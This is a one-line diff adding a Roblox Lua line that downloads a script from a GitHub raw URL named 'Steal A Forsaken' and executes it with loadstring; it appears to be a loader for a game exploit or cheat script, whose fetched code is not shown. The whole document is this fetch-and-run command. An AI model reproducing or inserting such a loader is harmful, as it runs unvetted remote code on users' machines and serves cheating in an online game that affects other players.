@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Typepuz/Roblox-Scripts/refs/heads/General/Steal%20A%20Forsaken"))()
